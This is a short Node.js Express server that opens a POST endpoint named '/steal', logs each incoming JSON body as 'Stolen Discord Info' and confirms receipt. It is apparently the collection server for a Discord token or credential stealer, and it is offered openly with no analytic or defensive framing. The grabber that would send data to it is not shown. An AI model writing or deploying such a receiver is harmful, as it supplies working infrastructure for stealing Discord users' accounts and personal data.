const express = require('express');
const bodyParser = require('body-parser');
const app = express();
const port = 3000;

app.use(bodyParser.json());

app.post('/steal', (req, res) => {
    const discordInfo = req.body;
    console.log('Stolen Discord Info:', discordInfo);
    res.send('Info received');
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}/`);
});